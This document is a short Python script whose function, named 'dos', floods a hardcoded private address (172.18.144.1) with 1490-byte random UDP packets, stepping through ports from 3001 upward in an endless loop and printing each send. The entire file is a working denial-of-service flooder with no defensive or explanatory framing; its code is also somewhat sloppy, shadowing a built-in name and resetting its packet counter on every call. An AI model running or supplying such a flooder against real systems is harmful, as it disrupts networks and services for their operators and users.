import sys
import os
import time
import socket
import random


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
arr = []


def dos(ip,port):
     sent = 0

     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print(sock)
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))



if __name__ == '__main__':
     port =3000
     while True:
          port=port+1
          d=dos('172.18.144.1',port)
          print(d)